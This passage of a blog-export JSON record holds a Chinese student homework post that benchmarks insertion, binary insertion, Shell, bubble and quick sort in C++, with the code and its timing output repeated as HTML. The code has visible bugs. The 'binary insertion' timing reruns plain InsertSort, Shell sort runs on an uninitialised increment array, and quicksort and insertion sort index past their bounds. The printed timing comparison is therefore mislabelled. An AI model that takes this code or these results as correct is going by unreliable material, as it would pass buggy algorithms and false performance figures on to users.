i=1;i<L.length;i++)\n\t\t\tL.elem[i]=rand();\n\t\tQueryPerformanceCounter(&time_start);\n\t\tQuickSort(L);\n\t\tQueryPerformanceCounter(&time_over);\n\t\trun_time=Decimal*(time_over.QuadPart-time_start.QuadPart)/dpFreq;\n\t\tcout<<\"快速排序:\"<<run_time<<\"ms\"<<endl;\n\t\tcout<<endl<<endl<<endl;\n\t\tif(MAXN>=10000)break;\n\t}\n\treturn 0;\n}\n```\n## Output\n```nohilight\n第1次测试, 数量级:10\n\n插入排序:0.00037758ms\n二分排序:0.00037758ms\n希尔排序:0.00302064ms\n冒泡排序:0.00037758ms\n快速排序:0.000755161ms\n\n\n\n第2次测试, 数量级:100\n\n插入排序:0.00717403ms\n二分排序:0.00830677ms\n希尔排序:0.0256755ms\n冒泡排序:0.027941ms\n快速排序:0.00717403ms\n\n\n\n第3次测试, 数量级:1000\n\n插入排序:0.65548ms\n二分排序:0.746099ms\n希尔排序:0.288849ms\n冒泡排序:2.10841ms\n快速排序:0.0887314ms\n\n\n\n第4次测试, 数量级:10000\n\n插入排序:81.4585ms\n二分排序:73.2691ms\n希尔排序:4.76695ms\n冒泡排序:357.605ms\n快速排序:1.55676ms\n```","source":"_posts/Sort.md","raw":"---\ntitle: 各种排序时间复杂度比较\ndate: 2019-03-29 17:11:09\ncategories:\n  - 数据结构\ntags:\n  - 排序\nabbrlink: '52089862'\nupdated:\n---\n# 各种排序时间复杂度比较\n**以下为数据结构作业**\n如有错误，请指出，谢谢！\n<!--more-->\n```cpp\n#include<iostream>\n#include<time.h>\n#include<windows.h>\n#include<cstdlib>\nconst int Decimal=1000;\nusing namespace std;\ntypedef struct\n{\n\tint *elem;\n\tint length;\n}SqList;\nvoid InsertSort(SqList L)\n{\n\tint i,j;\n\tfor(i=2;i<L.length;i++)\n\t{\n\t\tif(L.elem[i]<L.elem[i-1])\n\t\t{\n\t\t\tL.elem[0]=L.elem[i];\n\t\t\tL.elem[i]=L.elem[i-1];\n\t\t}\n\t\tfor(j=i-2;L.elem[0]<L.elem[j];j--)\n\t\t\tL.elem[j+1]=L.elem[j];\n\t\tL.elem[j+1]=L.elem[0];\n\t}\n}\nvoid BInsertSort(SqList L)\n{\n\tint i,j,high,low,m;\n\tfor(i=2;i<L.length;i++)\n\t{\n\t\tL.elem[0]=L.elem[i];\n\t\tlow=1;high=i-1;\n\t\twhile(low<=high)\n\t\t{\n\t\t\tm=(low+high)/2;\n\t\t\tif(L.elem[0]<L.elem[m])high=m-1;\n\t\t\telse low=m+1;\n\t\t}\n\t\tfor(j=i-1;j>=high+1;j--)\n\t\t\tL.elem[j+1]=L.elem[j];\n\t\tL.elem[high+1]=L.elem[0];\n\t}\n}\nvoid ShellInsert(SqList &L,int dk)\n{\n\tint i,j;\n\tfor(i=dk+1;i<L.length;i++)\n\t{\n\t\tif(L.elem[i]<L.elem[i-dk])\n\t\t{\n\t\t\tL.elem[0]=L.elem[i];\n\t\t\tfor(j=i-dk;j>0&&L.elem[0]<L.elem[j];j-=dk)\n\t\t\t\tL.elem[j+dk]=L.elem[j];\n\t\t\tL.elem[j+dk]=L.elem[0];\n\t\t}\n\t}\n}\nvoid ShellSort(SqList &L,int dt[],int t)\n{\n\tint k;\n\tfor(k=0;k<t;k++)\n\tShellInsert(L,dt[k]);\n}\nvoid BubbleSort(SqList &L)\n{\n\tint m=L.length-1,flag=1,t;\n\twhile((m>0)&&(flag==1))\n\t{\n\t\tflag=0;\n\t\tfor(int j=1;j<=m;j++)\n\t\t{\n\t\t\tif(L.elem[j]>L.elem[j+1])\n\t\t\t{\n\t\t\t\tflag=1;\n\t\t\t\tt=L.elem[j];\n\t\t\t\tL.elem[j]=L.elem[j+1];\n\t\t\t\tL.elem[j+1]=t;\n\t\t\t}\n\t\t}\n\t\t--m;\n\t}\n}\nint Partition(SqList &L,int low,int high)\n{\n\tL.elem[0]=L.elem[low];\n\tint privotkey=L.elem[low];\n\twhile(low<high)\n\t{\n\t\twhile(low<high&&L.elem[high]>=privotkey)--high;\n\t\t\tL.elem[low]=L.elem[high];\n\t\twhile(low<high&&L.elem[low]<=privotkey)++low;\n\t\t\tL.elem[high]=L.elem[low];\n\t}\n\tL.elem[low]=L.elem[0];\n\treturn low;\n}\nvoid QSort(SqList &L,int low,int high)\n{\n\tint  pivotloc;\n\tif(low<high)\n\t{\n\t\tpivotloc=Partition(L,low,high);\n\t\tQSort(L,low,pivotloc-1);\n\t\tQSort(L,pivotloc+1,high);\n\t}\n}\nvoid QuickSort(SqList &L)\n{\n\tQSort(L,1,L.length);\n}\nvoid Test(SqList &L)\n{\n\tfor(int i=1;i<L.length;i++)\n\tcout<<L.elem[i]<<\" \";\n\tcout<<endl;\n}\nint main()\n{\n\tint k=1,MAXN=1;\n\tSqList L;\n\tdouble run_time,dpFreq;\n\t_LARGE_INTEGER time_start; //开始时间\n\t_LARGE_INTEGER time_over; //结束时间\n\tLARGE_INTEGER f;\n\tQueryPerformanceFrequency(&f);\n\tdpFreq=(double)f.QuadPart; //计时器频率\n\twhile(true)\n\t{\n\t\tMAXN*=10;\n\t\tL.elem=new int[MAXN+1];\n\t\tL.length=MAXN;\n\t\tcout<<\"第\"<<k++<<\"次测试, 数量级:\"<<MAXN<<endl<<endl;\n\t\tsrand((unsigned)time(NULL));\n\t\tfor(int i=1;i<L.length;i++)\n\t\t\tL.elem[i]=rand();\n\t\tQueryPerformanceCounter(&time_start);  //计时开始\n\t\tInsertSort(L);\n\t\tQueryPerformanceCounter(&time_over);  //计时结束\n\t\trun_time=Decimal*(time_over.QuadPart-time_start.QuadPart)/dpFreq;\n\t\tcout<<\"插入排序:\"<<run_time<<\"ms\"<<endl;\n\t\tfor(int i=1;i<L.length;i++)\n\t\t\tL.elem[i]=rand();\n\t\tQueryPerformanceCounter(&time_start);\n\t\tInsertSort(L);\n\t\tQueryPerformanceCounter(&time_over);\n\t\trun_time=Decimal*(time_over.QuadPart-time_start.QuadPart)/dpFreq;\n\t\tcout<<\"二分排序:\"<<run_time<<\"ms\"<<endl;\n\t\tint dt[100001],t=100;\n\t\tQueryPerformanceCounter(&time_start);\n\t\tShellSort(L,dt,t);\n\t\tQueryPerformanceCounter(&time_over);\n\t\trun_time=Decimal*(time_over.QuadPart-time_start.QuadPart)/dpFreq;\n\t\tcout<<\"希尔排序:\"<<run_time<<\"ms\"<<endl;\n\t\tfor(int i=1;i<L.length;i++)\n\t\t\tL.elem[i]=rand();\n\t\tQueryPerformanceCounter(&time_start);\n\t\tBubbleSort(L);\n\t\tQueryPerformanceCounter(&time_over);\n\t\trun_time=Decimal*(time_over.QuadPart-time_start.QuadPart)/dpFreq;\n\t\tcout<<\"冒泡排序:\"<<run_time<<\"ms\"<<endl;\n\t\tfor(int i=1;i<L.length;i++)\n\t\t\tL.elem[i]=rand();\n\t\tQueryPerformanceCounter(&time_start);\n\t\tQuickSort(L);\n\t\tQueryPerformanceCounter(&time_over);\n\t\trun_time=Decimal*(time_over.QuadPart-time_start.QuadPart)/dpFreq;\n\t\tcout<<\"快速排序:\"<<run_time<<\"ms\"<<endl;\n\t\tcout<<endl<<endl<<endl;\n\t\tif(MAXN>=10000)break;\n\t}\n\treturn 0;\n}\n```\n## Output\n```nohilight\n第1次测试, 数量级:10\n\n插入排序:0.00037758ms\n二分排序:0.00037758ms\n希尔排序:0.00302064ms\n冒泡排序:0.00037758ms\n快速排序:0.000755161ms\n\n\n\n第2次测试, 数量级:100\n\n插入排序:0.00717403ms\n二分排序:0.00830677ms\n希尔排序:0.0256755ms\n冒泡排序:0.027941ms\n快速排序:0.00717403ms\n\n\n\n第3次测试, 数量级:1000\n\n插入排序:0.65548ms\n二分排序:0.746099ms\n希尔排序:0.288849ms\n冒泡排序:2.10841ms\n快速排序:0.0887314ms\n\n\n\n第4次测试, 数量级:10000\n\n插入排序:81.4585ms\n二分排序:73.2691ms\n希尔排序:4.76695ms\n冒泡排序:357.605ms\n快速排序:1.55676ms\n```","slug":"Sort","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkbu002fqse5hj6r95b8","content":"<h1 id=\"各种排序时间复杂度比较\"><a href=\"#各种排序时间复杂度比较\" class=\"headerlink\" title=\"各种排序时间复杂度比较\"></a>各种排序时间复杂度比较</h1><p><strong>以下为数据结构作业</strong><br>如有错误，请指出，谢谢！<br><a id=\"more\"></a><br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;time.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdlib&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> Decimal=<span class=\"number\">1000</span>;</span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> *elem;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> length;</span><br><span class=\"line\">&#125;SqList;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">InsertSort</span><span class=\"params\">(SqList L)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i,j;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">2</span>;i&lt;L.length;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(L.elem[i]&lt;L.elem[i<span class=\"number\">-1</span>])</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tL.elem[<span class=\"number\">0</span>]=L.elem[i];</span><br><span class=\"line\">\t\t\tL.elem[i]=L.elem[i<span class=\"number\">-1</span>];</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(j=i<span class=\"number\">-2</span>;L.elem[<span class=\"number\">0</span>]&lt;L.elem[j];j--)</span><br><span class=\"line\">\t\t\tL.elem[j+<span class=\"number\">1</span>]=L.elem[j];</span><br><span class=\"line\">\t\tL.elem[j+<span class=\"number\">1</span>]=L.elem[<span class=\"number\">0</span>];</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">BInsertSort</span><span class=\"params\">(SqList L)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i,j,high,low,m;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">2</span>;i&lt;L.length;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tL.elem[<span class=\"number\">0</span>]=L.elem[i];</span><br><span class=\"line\">\t\tlow=<span class=\"number\">1</span>;high=i<span class=\"number\">-1</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span>(low&lt;=high)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tm=(low+high)/<span class=\"number\">2</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(L.elem[<span class=\"number\">0</span>]&lt;L.elem[m])high=m<span class=\"number\">-1</span>;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span> low=m+<span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(j=i<span class=\"number\">-1</span>;j&gt;=high+<span class=\"number\">1</span>;j--)</span><br><span class=\"line\">\t\t\tL.elem[j+<span class=\"number\">1</span>]=L.elem[j];</span><br><span class=\"line\">\t\tL.elem[high+<span class=\"number\">1</span>]=L.elem[<span class=\"number\">0</span>];</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">ShellInsert</span><span class=\"params\">(SqList &amp;L,<span class=\"keyword\">int</span> dk)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i,j;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i=dk+<span class=\"number\">1</span>;i&lt;L.length;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(L.elem[i]&lt;L.elem[i-dk])</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tL.elem[<span class=\"number\">0</span>]=L.elem[i];</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">for</span>(j=i-dk;j&gt;<span class=\"number\">0</span>&amp;&amp;L.elem[<span class=\"number\">0</span>]&lt;L.elem[j];j-=dk)</span><br><span class=\"line\">\t\t\t\tL.elem[j+dk]=L.elem[j];</span><br><span class=\"line\">\t\t\tL.elem[j+dk]=L.elem[<span class=\"number\">0</span>];</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">ShellSort</span><span class=\"params\">(SqList &amp;L,<span class=\"keyword\">int</span> dt[],<span class=\"keyword\">int</span> t)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> k;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(k=<span class=\"number\">0</span>;k&lt;t;k++)</span><br><span class=\"line\">\tShellInsert(L,dt[k]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">BubbleSort</span><span class=\"params\">(SqList &amp;L)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> m=L.length<span class=\"number\">-1</span>,flag=<span class=\"number\">1</span>,t;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>((m&gt;<span class=\"number\">0</span>)&amp;&amp;(flag==<span class=\"number\">1</span>))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tflag=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> j=<span class=\"number\">1</span>;j&lt;=m;j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(L.elem[j]&gt;L.elem[j+<span class=\"number\">1</span>])</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tflag=<span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t\t\tt=L.elem[j];</span><br><span class=\"line\">\t\t\t\tL.elem[j]=L.elem[j+<span class=\"number\">1</span>];</span><br><span class=\"line\">\t\t\t\tL.elem[j+<span class=\"number\">1</span>]=t;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t--m;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">Partition</span><span class=\"params\">(SqList &amp;L,<span class=\"keyword\">int</span> low,<span class=\"keyword\">int</span> high)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tL.elem[<span class=\"number\">0</span>]=L.elem[low];</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> privotkey=L.elem[low];</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(low&lt;high)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span>(low&lt;high&amp;&amp;L.elem[high]&gt;=privotkey)--high;</span><br><span class=\"line\">\t\t\tL.elem[low]=L.elem[high];</span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span>(low&lt;high&amp;&amp;L.elem[low]&lt;=privotkey)++low;</span><br><span class=\"line\">\t\t\tL.elem[high]=L.elem[low];</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tL.elem[low]=L.elem[<span class=\"number\">0</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> low;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">QSort</span><span class=\"params\">(SqList &amp;L,<span class=\"keyword\">int</span> low,<span class=\"keyword\">int</span> high)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span>  pivotloc;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(low&lt;high)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tpivotloc=Partition(L,low,high);</span><br><span class=\"line\">\t\tQSort(L,low,pivotloc<span class=\"number\">-1</span>);</span><br><span class=\"line\">\t\tQSort(L,pivotloc+<span class=\"number\">1</span>,high);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">QuickSort</span><span class=\"params\">(SqList &amp;L)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tQSort(L,<span class=\"number\">1</span>,L.length);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">Test</span><span class=\"params\">(SqList &amp;L)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>;i&lt;L.length;i++)</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span>&lt;&lt;L.elem[i]&lt;&lt;<span class=\"string\">&quot; &quot;</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> k=<span class=\"number\">1</span>,MAXN=<span class=\"number\">1</span>;</span><br><span class=\"line\">\tSqList L;</span><br><span class=\"line\">\t<span class=\"keyword\">double</span> run_time,dpFreq;</span><br><span class=\"line\">\t_LARGE_INTEGER time_start; <span class=\"comment\">//开始时间</span></span><br><span class=\"line\">\t_LARGE_INTEGER time_over; <span class=\"comment\">//结束时间</span></span><br><span class=\"line\">\tLARGE_INTEGER f;</span><br><span class=\"line\">\tQueryPerformanceFrequency(&amp;f);</span><br><span class=\"line\">\tdpFreq=(<span class=\"keyword\">double</span>)f.QuadPart; <span class=\"comment\">//计时器频率</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(<span class=\"literal\">true</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tMAXN*=<span class=\"number\">10</span>;</span><br><span class=\"line\">\t\tL.elem=<span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[MAXN+<span class=\"number\">1</span>];</span><br><span class=\"line\">\t\tL.length=MAXN;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;第&quot;</span>&lt;&lt;k++&lt;&lt;<span class=\"string\">&quot;次测试, 数量级:&quot;</span>&lt;&lt;MAXN&lt;&lt;<span class=\"built_in\">endl</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t\tsrand((<span class=\"keyword\">unsigned</span>)time(<span class=\"literal\">NULL</span>));</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>;i&lt;L.length;i++)</span><br><span class=\"line\">\t\t\tL.elem[i]=rand();</span><br><span class=\"line\">\t\tQueryPerformanceCounter(&amp;time_start);  <span class=\"comment\">//计时开始</span></span><br><span class=\"line\">\t\tInsertSort(L);</span><br><span class=\"line\">\t\tQueryPerformanceCounter(&amp;time_over);  <span class=\"comment\">//计时结束</span></span><br><span class=\"line\">\t\trun_time=Decimal*(time_over.QuadPart-time_start.QuadPart)/dpFreq;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;插入排序:&quot;</span>&lt;&lt;run_time&lt;&lt;<span class=\"string\">&quot;ms&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>;i&lt;L.length;i++)</span><br><span class=\"line\">\t\t\tL.elem[i]=rand();</span><br><span class=\"line\">\t\tQueryPerformanceCounter(&amp;time_start);</span><br><span class=\"line\">\t\tInsertSort(L);</span><br><span class=\"line\">\t\tQueryPerformanceCounter(&amp;time_over);</span><br><span class=\"line\">\t\trun_time=Decimal*(time_over.QuadPart-time_start.QuadPart)/dpFreq;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;二分排序:&quot;</span>&lt;&lt;run_time&lt;&lt;<span class=\"string\">&quot;ms&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> dt[<span class=\"number\">100001</span>],t=<span class=\"number\">100</span>;</span><br><span class=\"line\">\t\tQueryPerformanceCounter(&amp;time_start);</span><br><span class=\"line\">\t\tShellSort(L,dt,t);</span><br><span class=\"line\">\t\tQueryPerformanceCounter(&amp;time_over);</span><br><span class=\"line\">\t\trun_time=Decimal*(time_over.QuadPart-time_start.QuadPart)/dpFreq;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;希尔排序:&quot;</span>&lt;&lt;run_time&lt;&lt;<span class=\"string\">&quot;ms&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>;i&lt;L.length;i++)</span><br><span class=\"line\">\t\t\tL.elem[i]=rand();</span><br><span class=\"line\">\t\tQueryPerformanceCounter(&amp;time_start);</span><br><span class=\"line\">\t\tBubbleSort(L);</span><br><span class=\"line\">\t\tQueryPerformanceCounter(&amp;time_over);</span><br><span class=\"line\">\t\trun_time=Decimal*(time_over.QuadPart-time_start.QuadPart)/dpFreq;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;冒泡排序:&quot;</span>&lt;&lt;run_time&lt;&lt;<span class=\"string\">&quot;ms&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>;i&lt;L.length;i++)</span><br><span class=\"line\">\t\t\tL.elem[i]=rand();</span><br><span class=\"line\">\t\tQueryPerformanceCounter(&amp;time_start);</span><br><span class=\"line\">\t\tQuickSort(L);</span><br><span class=\"line\">\t\tQueryPerformanceCounter(&amp;time_over);</span><br><span class=\"line\">\t\trun_time=Decimal*(time_over.QuadPart-time_start.QuadPart)/dpFreq;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"string\">&quot;快速排序:&quot;</span>&lt;&lt;run_time&lt;&lt;<span class=\"string\">&quot;ms&quot;</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span>&lt;&lt;<span class=\"built_in\">endl</span>&lt;&lt;<span class=\"built_in\">endl</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(MAXN&gt;=<span class=\"number\">10000</span>)<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"Output\"><a href=\"#Output\" class=\"headerlink\" title=\"Output\"></a>Output</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span 